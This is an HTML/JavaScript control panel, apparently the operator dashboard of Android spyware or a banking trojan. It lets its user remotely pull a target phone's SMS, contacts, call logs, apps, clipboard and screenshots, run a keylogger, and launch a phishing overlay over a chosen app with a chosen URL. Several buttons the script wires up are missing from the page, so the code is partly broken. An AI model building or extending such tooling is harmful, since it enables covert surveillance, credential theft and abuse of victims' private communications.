<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Device Control ‚Äî Dashboard</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    :root{
      --bg:#0f1724;
      --panel:#0b1220;
      --muted:#94a3b8;
      --accent:#60a5fa;
      --accent-2:#10b981;
      --card:#071025;
      --glass: rgba(255,255,255,0.03);
      --radius:10px;
    }
    html,body{height:100%; margin:0; font-family:Inter,ui-sans-serif,system-ui,Segoe UI,Roboto,"Helvetica Neue",Arial; background:linear-gradient(180deg,#071026 0%, #07172a 100%); color:#e6eef8;}
    .app {
      display: grid;
      grid-template-columns: 260px 1fr 80px; /* left sidebar, main, right icon bar */
      height: 100vh;
      gap: 12px;
      padding: 18px;
      box-sizing: border-box;
    }

    /* LEFT SIDEBAR (controls + device info) */
    #left {
      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
      border-radius: var(--radius);
      padding: 18px;
      border: 1px solid rgba(255,255,255,0.03);
      display:flex;
      flex-direction:column;
      gap:12px;
    }
    #left h2{margin:0;color:var(--accent); font-size:18px;}
    .device-meta { color:var(--muted); font-size:13px; }
    .left-buttons { display:flex; flex-wrap:wrap; gap:8px; }
    .btn {
      background:linear-gradient(180deg,#142634,#0f2434);
      border:1px solid rgba(255,255,255,0.04);
      color:#fff; padding:8px 10px; border-radius:8px; cursor:pointer; font-weight:600;
      font-size:13px;
    }
    .btn.ghost {
      background: transparent; border:1px solid rgba(255,255,255,0.04); color:var(--muted);
    }

    /* MAIN AREA */
    #main {
      display:flex;
      flex-direction:column;
      gap:12px;
    }

    /* top quick controls row */
    #topControls {
      display:flex;
      align-items:center;
      gap:12px;
      background:var(--glass);
      padding:10px;
      border-radius:10px;
      border:1px solid rgba(255,255,255,0.02);
    }
    #topControls .status {
      padding:6px 10px; border-radius:999px; font-size:13px; color:#032; background:rgba(16,185,129,0.12);
    }

    /* panels container (left column content) */
    #panels {
      display: grid;
      grid-template-columns: 1fr 360px; /* primary display + side (screenshots) */
      gap: 12px;
      height: calc(100% - 86px);
    }

    /* main display (left) */
    #display {
      background:#071827;
      border-radius:10px;
      padding:12px;
      border:1px solid rgba(255,255,255,0.02);
      display:flex;
      flex-direction:column;
      gap:8px;
      overflow:hidden;
    }

    /* tabs for display */
    .tabs {
      display:flex;
      gap:8px;
      margin-bottom:8px;
    }
    .tab {
      background:transparent; color:var(--muted); border:none; padding:6px 8px; cursor:pointer; border-radius:8px; font-weight:600;
    }
    .tab.active { background:linear-gradient(90deg, rgba(96,165,250,0.12), rgba(16,185,129,0.06)); color:var(--accent); }

    /* content panels (scrollable) */
    .content {
      background: rgba(255,255,255,0.02);
      border-radius:8px;
      padding:10px;
      height:100%;
      overflow:auto;
      font-family: monospace;
      font-size:13px;
      color:#dbeafe;
    }

    /* right screenshots column */
    #rightColumn {
      display:flex; flex-direction:column; gap:12px;
    }
    .shotsCard {
      background:#071827; border-radius:10px; padding:12px; border:1px solid rgba(255,255,255,0.02); height:100%; overflow:auto;
    }
    #screenshotGrid {
      display:grid; grid-template-columns: repeat(auto-fill, minmax(140px,1fr)); gap:10px;
    }
    .shotItem {
      background: linear-gradient(180deg,#071a27,#06151f);
      border-radius:10px; padding:8px; text-align:center; border:1px solid rgba(255,255,255,0.02);
    }
    .shotItem img { width:100%; height:120px; object-fit:cover; border-radius:6px; cursor:zoom-in; display:block; margin-bottom:8px; }
    .shotItem .stamp { font-size:12px; color:var(--muted); margin-bottom:6px; }
    .shotItem button { width:100%; padding:8px; border-radius:8px; background:var(--accent); border:none; color:white; cursor:pointer; font-weight:600; }

    /* RIGHT ICON BAR */
    #rightbar {
      background:linear-gradient(180deg,#071026,#071026);
      border-radius:var(--radius);
      padding:10px;
      display:flex; flex-direction:column; gap:8px; align-items:center; border:1px solid rgba(255,255,255,0.03);
    }
    .icon-btn {
      width:54px; height:54px; display:flex; align-items:center; justify-content:center; border-radius:10px; background:transparent; border:1px solid rgba(255,255,255,0.03); cursor:pointer;
    }
    .icon-btn svg { width:26px; height:26px; fill:var(--muted); }

    /* small helpers */
    .flex { display:flex; gap:8px; align-items:center; }
    .muted { color:var(--muted); font-size:13px; }

    /* modal for image view */
    .modal {
      position:fixed; inset:0; display:none; align-items:center; justify-content:center; background:rgba(0,0,0,0.6); z-index:9999;
    }
    .modal.show { display:flex; }
    .modal .box { background:#021222; padding:12px; border-radius:10px; max-width:95%; max-height:95%; overflow:auto; }
    .modal img { max-width:100%; height:auto; display:block; border-radius:6px; }

    /* responsive */
    @media (max-width:1100px) {
      .app { grid-template-columns: 1fr; padding:12px; }
      #rightbar { flex-direction:row; width:100%; justify-content:space-around; }
      #panels { grid-template-columns: 1fr; height: calc(100% - 120px); }
      #rightColumn { order: 2; }
    }
  </style>
</head>
<body>
  <div class="app">

    <!-- LEFT SIDEBAR -->
    <aside id="left">
      <h2 id="devName">Device</h2>
      <div class="device-meta">ID: <span id="devId">unknown</span></div>
      <div class="device-meta" style="margin-top:6px;">Status: <span id="status" class="muted">Offline</span></div>

      <div class="left-buttons" style="margin-top:8px;">
        <!-- preserve your original IDs so JS stays compatible -->
        <button class="btn" id="btnFetch">Fetch Notification</button>
        <button class="btn" id="btnStartNotify">Start Notify</button>
        <button class="btn ghost" id="btnStopNotify">Stop Notify</button>
      </div>

      <div style="margin-top:10px;">
        <div style="font-size:13px; color:var(--muted); margin-bottom:6px;">Quick actions</div>
        <div class="left-buttons">
          <button class="btn" id="btnFetchSms">Fetch SMS</button>
          <button class="btn" id="btnFetchContact">Fetch Contacts</button>
          <button class="btn" id="btnFetchLog">Fetch Calls</button>
          <button class="btn" id="btnFetchApps">Fetch Apps</button>
          <button class="btn" id="btnFetchDevice">Device Info</button>
          <button class="btn" id="btnFetchScreenshot">Fetch Screenshot</button>
        </div>
      </div>

      <div style="margin-top:auto;">
        <div style="font-size:12px; color:var(--muted); margin-bottom:6px;">Overlay</div>
        <label class="muted">Package</label>
        <input id="pkgInput" type="text" placeholder="com.example.app" style="width:100%; padding:8px; border-radius:8px; border:none; margin-bottom:6px; background:#041826; color:#cfe7ff;">
        <label class="muted">URL</label>
        <input id="urlInput" type="text" placeholder="https://..." style="width:100%; padding:8px; border-radius:8px; border:none; margin-bottom:8px; background:#041826; color:#cfe7ff;">
        <div style="display:flex; gap:8px;">
          <button class="btn" id="btnCustomOverlay">Start Overlay</button>
          <button class="btn ghost" id="btnStopOverlay">Stop Overlay</button>
        </div>
      </div>
    </aside>

    <!-- MAIN -->
    <main id="main">
      <div id="topControls">
        <div class="flex">
          <div style="font-weight:700; color:var(--accent);">Live Device Console</div>
          <div style="color:var(--muted); margin-left:10px;">Client: <span id="devIdTop" class="muted">unknown</span></div>
        </div>
        <div style="margin-left:auto" class="flex">
          <div id="onlineIndicator" class="status">Online</div>
        </div>
      </div>

      <div id="panels">
        <!-- LEFT display area -->
        <section id="display">
          <div class="tabs">
            <button class="tab active" data-tab="logs">Logs</button>
            <button class="tab" data-tab="sms">SMS</button>
            <button class="tab" data-tab="contacts">Contacts</button>
            <button class="tab" data-tab="calls">Calls</button>
            <button class="tab" data-tab="apps">Apps</button>
            <button class="tab" data-tab="screenshots">Screenshots</button>
          </div>

          <div id="panelLogs" class="content" data-name="logs"></div>
          <div id="panelSms" class="content" style="display:none;" data-name="sms"></div>
          <div id="panelContacts" class="content" style="display:none;" data-name="contacts"></div>
          <div id="panelCalls" class="content" style="display:none;" data-name="calls"></div>
          <div id="panelApps" class="content" style="display:none;" data-name="apps"></div>
          <div id="panelScreenshots" class="content" style="display:none;" data-name="screenshots"></div>
        </section>

        <!-- RIGHT column: screenshot gallery + controls -->
        <aside id="rightColumn">
          <div class="shotsCard">
            <div style="display:flex; justify-content:space-between; align-items:center;">
              <div style="font-weight:700;">Screenshots</div>
              <div class="muted">Auto saved</div>
            </div>
            <div id="screenshotGrid" style="margin-top:10px;"></div>
          </div>
        </aside>
      </div>
    </main>

    <!-- RIGHT ICON BAR -->
    <aside id="rightbar">
      <!-- Icons call the same commands -->
      <button class="icon-btn" title="Fetch SMS" id="iconSms" data-cmd="fetch-sms">
        <!-- SMS icon -->
        <svg viewBox="0 0 24 24"><path d="M2 3v14h6l3 3 3-3h6V3H2zm18 12H9.828L8 18.828 6.172 17H4V5h16v10z"/></svg>
      </button>

      <button class="icon-btn" title="Fetch Calls" id="iconCalls" data-cmd="fetch-logs">
        <svg viewBox="0 0 24 24"><path d="M6.62 10.79a15.091 15.091 0 006.59 6.59l2.2-2.2a1 1 0 01.97-.24 11.72 11.72 0 003.66.58 1 1 0 011 1V20a1 1 0 01-1 1A17 17 0 013 4a1 1 0 011-1h3.5a1 1 0 011 1c0 1.26.2 2.49.58 3.66a1 1 0 01-.24.97L6.62 10.79z"/></svg>
      </button>

      <button class="icon-btn" title="Fetch Contacts" id="iconContacts" data-cmd="fetch-contact">
        <svg viewBox="0 0 24 24"><path d="M12 12a5 5 0 100-10 5 5 0 000 10zm0 2c-3.33 0-10 1.67-10 5v3h20v-3c0-3.33-6.67-5-10-5z"/></svg>
      </button>

      <button class="icon-btn" title="Fetch Apps" id="iconApps" data-cmd="fetch-apps">
        <svg viewBox="0 0 24 24"><path d="M3 3h8v8H3zM13 3h8v8h-8zM3 13h8v8H3zM13 13h8v8h-8z"/></svg>
      </button>

      <button class="icon-btn" title="Fetch Screenshot" id="iconScreenshot" data-cmd="fetch-screenshot">
        <svg viewBox="0 0 24 24"><path d="M9 2L7.17 4H4c-1.1 0-2 .9-2 2v11a2 2 0 002 2h16a2 2 0 002-2V6a2 2 0 00-2-2h-3.17L15 2H9zm3 14a5 5 0 110-10 5 5 0 010 10z"/></svg>
      </button>

      <button class="icon-btn" title="Fetch Device Info" id="iconDevice" data-cmd="fetch-device">
        <svg viewBox="0 0 24 24"><path d="M12 2a9 9 0 100 18 9 9 0 000-18zm1 14h-2v-6h2v6zm0-8h-2V6h2v2z"/></svg>
      </button>
    </aside>
  </div>

  <!-- Modal for full image preview -->
  <div id="imageModal" class="modal" onclick="closeModal()">
    <div class="box" onclick="event.stopPropagation()">
      <img id="modalImage" src="" alt="Preview">
      <div style="display:flex; gap:8px; margin-top:8px;">
        <button class="btn" id="modalDownload">Download</button>
        <button class="btn ghost" onclick="closeModal()">Close</button>
      </div>
    </div>
  </div>

<script>
/* ---------------------------------------
   Helper: sendCmd ‚Äî calls server endpoint
   (keeps your existing API unchanged)
----------------------------------------*/
async function sendCmd(cmd) {
  pushLog(`üì§ Sending "${cmd}"...`);
  try {
    const r = await fetch("/command", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({ targetClientId: clientId, command: cmd })
    });
    if (!r.ok) pushLog(`‚ùå Failed: ${r.status}`);
    else pushLog(`‚úÖ Command sent (${cmd})`);
  } catch (e) {
    pushLog(`‚ö†Ô∏è Network error: ${e.message}`);
  }
}

/* --- wire up original buttons (preserve your IDs) --- */
document.getElementById("btnFetch").onclick = () => sendCmd("fetch");
document.getElementById("btnStartNotify").onclick = () => sendCmd("start-notify");
document.getElementById("btnStopNotify").onclick = () => sendCmd("stop-notify");
document.getElementById("btnFetchSms").onclick = () => sendCmd("fetch-sms");
document.getElementById("btnFetchContact").onclick = () => sendCmd("fetch-contact");
document.getElementById("btnFetchLog").onclick = () => sendCmd("fetch-logs");
document.getElementById("btnFetchApps").onclick = () => sendCmd("fetch-apps");
document.getElementById("btnFetchIp").onclick = () => sendCmd("fetch-ip");
document.getElementById("btnFetchClip").onclick = () => sendCmd("fetch-clip");
document.getElementById("btnStartKeyLog").onclick = () => sendCmd("start_keylog");
document.getElementById("btnStopKeyLog").onclick = () => sendCmd("stop_keylog");
document.getElementById("btnFetchKeyLog").onclick = () => sendCmd("fetch_keylog");
document.getElementById("btnFetchDevice").onclick = () => sendCmd("fetch-device");
document.getElementById("btnFetchScreenshot").onclick = () => sendCmd("fetch-screenshot");
document.getElementById("btnFetchScreenshotPermission").onclick = () => sendCmd("grant-screenshot-permission");
document.getElementById("btnUpload").onclick = () => sendCmd("upload");
document.getElementById("btnCustomOverlay").onclick = () => {
  const pkg = document.getElementById("pkgInput").value.trim();
  const url = document.getElementById("urlInput").value.trim();
  if (!pkg || !url) { pushLog("‚ö†Ô∏è Please enter both PackageName and URL"); return; }
  const cmd = `start-overlay{url:${url},PackageName:${pkg}}`;
  sendCmd(cmd);
};
document.getElementById("btnStopOverlay").onclick = () => sendCmd("stop-overlay");
document.getElementById("btnClose").onclick = () => window.close();

/* icon bar wiring */
document.querySelectorAll("#rightbar .icon-btn").forEach(b=>{
  b.addEventListener("click", ()=> {
    const c = b.dataset.cmd;
    if (c) sendCmd(c);
  });
});

/* ---------------------------------------
   Tabs logic
----------------------------------------*/
document.querySelectorAll(".tab").forEach(t=>{
  t.addEventListener("click", ()=>{
    document.querySelectorAll(".tab").forEach(x=>x.classList.remove("active"));
    t.classList.add("active");
    const target = t.dataset.tab;
    document.querySelectorAll("[data-name]").forEach(p=> p.style.display = (p.dataset.name === target ? "block" : "none"));
  });
});

/* ---------------------------------------
   WebSocket for live updates (same as your original code)
----------------------------------------*/
const pathParts = window.location.pathname.split("/");
const clientId = pathParts[pathParts.length - 1] || "unknown";
const urlParams = new URLSearchParams(location.search);
const deviceName = decodeURIComponent(urlParams.get("name") || clientId);

document.getElementById("devName").textContent = deviceName;
document.getElementById("devId").textContent = clientId;
document.getElementById("devIdTop").textContent = clientId;

const logPanel = document.getElementById("panelLogs");
const smsPanel = document.getElementById("panelSms");
const contactsPanel = document.getElementById("panelContacts");
const callsPanel = document.getElementById("panelCalls");
const appsPanel = document.getElementById("panelApps");
const screenshotsPanel = document.getElementById("panelScreenshots");
const screenshotGrid = document.getElementById("screenshotGrid");

function pushLog(msg){
  const ts = new Date().toLocaleTimeString();
  const line = `[${ts}] ${msg}`;
  const el = document.createElement("div");
  el.textContent = line;
  logPanel.appendChild(el);
  logPanel.scrollTop = logPanel.scrollHeight;
}

/* lightweight routing heuristics ‚Äî tweak to match how your Android app formats messages */
function routeMessageToPanel(output){
  const low = output.toLowerCase();

  // SCREENSHOT (your existing detection)
  if (output.includes("supabase.co") || output.includes("s3.") || output.includes("storage.googleapis")) {
    addScreenshotToGrid(output);
    const el = document.createElement("div");
    el.innerHTML = `<b>Screenshot:</b> <a href="${escapeHtml(output)}" target="_blank">${escapeHtml(truncate(output,60))}</a>`;
    screenshotsPanel.appendChild(el);
    screenshotsPanel.scrollTop = screenshotsPanel.scrollHeight;
    return;
  }

  // SMS detection (common prefixes)
  if (low.includes("sms:") || low.includes("text:") || low.includes("message:") || low.includes("sms|")) {
    const el = document.createElement("div");
    el.textContent = output;
    smsPanel.appendChild(el);
    smsPanel.scrollTop = smsPanel.scrollHeight;
    return;
  }

  // CONTACTS detection
  if (low.includes("contact:") || low.includes("name:") && low.includes("phone")) {
    const el = document.createElement("div");
    el.textContent = output;
    contactsPanel.appendChild(el);
    contactsPanel.scrollTop = contactsPanel.scrollHeight;
    return;
  }

  // CALLS / LOGS
  if (low.includes("call") || low.includes("calllog") || low.includes("missed") || low.includes("incoming") || low.includes("outgoing")) {
    const el = document.createElement("div");
    el.textContent = output;
    callsPanel.appendChild(el);
    callsPanel.scrollTop = callsPanel.scrollHeight;
    return;
  }

  // APPS
  if (low.includes("package:") || low.includes("installed") || low.includes("app:")) {
    const el = document.createElement("div");
    el.textContent = output;
    appsPanel.appendChild(el);
    appsPanel.scrollTop = appsPanel.scrollHeight;
    return;
  }

  // Default goes to logs (already done by pushLog)
}

/* WebSocket connection (re-uses your path + host logic) */
const wsProto = location.protocol === "https:" ? "wss://" : "ws://";
const ws = new WebSocket(wsProto + location.host);

ws.onopen = () => { pushLog("üîå WebSocket connected"); document.getElementById("onlineIndicator").textContent = "Online"; };
ws.onclose = () => { pushLog("‚ùå WebSocket disconnected"); document.getElementById("onlineIndicator").textContent = "Offline"; };
ws.onerror = (e)=> pushLog(`‚ö†Ô∏è WS error: ${e?.message || e}`);

ws.onmessage = (evt) => {
  try {
    const msg = JSON.parse(evt.data);

    // Update devices presence if included
    if (msg.type === "devices") {
      const d = msg.devices && msg.devices[clientId];
      if (d && d.online) {
        document.getElementById("status").textContent = "Online";
        document.getElementById("status").style.color = "#7ef0c3";
      } else {
        document.getElementById("status").textContent = "Offline";
        document.getElementById("status").style.color = "#fca5a5";
      }
    }

    // Response messages
    if (msg.type === "response" && msg.clientId === clientId) {
      pushLog(`üì© Response: ${msg.output}`);
      routeMessageToPanel(msg.output);
    }

  } catch (e) {
    console.error("WS parse error", e);
  }
};

/* ---------------------------------------
   Screenshot grid handling (zoom + download)
----------------------------------------*/
function addScreenshotToGrid(url){
  const item = document.createElement("div");
  item.className = "shotItem";

  const img = document.createElement("img");
  img.src = url;
  img.alt = "screenshot";
  img.loading = "lazy";

  // timestamp label
  const d = new Date();
  const stamp = `${d.getFullYear()}-${pad(d.getMonth()+1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
  const label = document.createElement("div");
  label.className = "stamp";
  label.textContent = stamp;

  // download button
  const btn = document.createElement("button");
  btn.textContent = "Download";
  btn.onclick = async (ev) => {
    ev.stopPropagation();
    try {
      const res = await fetch(url);
      const blob = await res.blob();
      const blobUrl = URL.createObjectURL(blob);
      const fn = `screenshot_${stamp.replace(/[: ]/g,'_')}.jpg`;
      const a = document.createElement("a");
      a.href = blobUrl;
      a.download = fn;
      document.body.appendChild(a);
      a.click();
      a.remove();
      URL.revokeObjectURL(blobUrl);
    } catch (e) {
      console.error("Download error:", e);
      pushLog("‚ö†Ô∏è Download failed");
    }
  };

  // click image -> modal preview
  img.onclick = () => {
    openModal(url, stamp);
  };

  item.appendChild(img);
  item.appendChild(label);
  item.appendChild(btn);

  // newest first
  screenshotGrid.prepend(item);

  // also add entry to screenshots panel
  const line = document.createElement("div");
  line.textContent = `${stamp} ‚Äî ${url}`;
  screenshotsPanel.appendChild(line);
}

/* modal helpers */
function openModal(url, stamp){
  const modal = document.getElementById("imageModal");
  const img = document.getElementById("modalImage");
  img.src = url;
  modal.classList.add("show");
  const dl = document.getElementById("modalDownload");
  dl.onclick = async () => {
    try {
      const res = await fetch(url);
      const blob = await res.blob();
      const blobUrl = URL.createObjectURL(blob);
      const a = document.createElement("a");
      const fn = `screenshot_${stamp.replace(/[: ]/g,'_')}.jpg`;
      a.href = blobUrl; a.download = fn;
      document.body.appendChild(a);
      a.click();
      a.remove();
      URL.revokeObjectURL(blobUrl);
    } catch (e) { console.error(e); pushLog("‚ö†Ô∏è Modal download failed"); }
  };
}
function closeModal(){ document.getElementById("imageModal").classList.remove("show"); document.getElementById("modalImage").src = ""; }

/* small util */
function pad(n){ return n < 10 ? "0"+n : n; }
function truncate(s,n){ return s.length > n ? s.slice(0,n-3) + "..." : s; }
function escapeHtml(s){ return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }

/* Expose pushRemoteLog for console use (keeps compatibility) */
window.pushRemoteLog = pushLog;
</script>
</body>
</html>
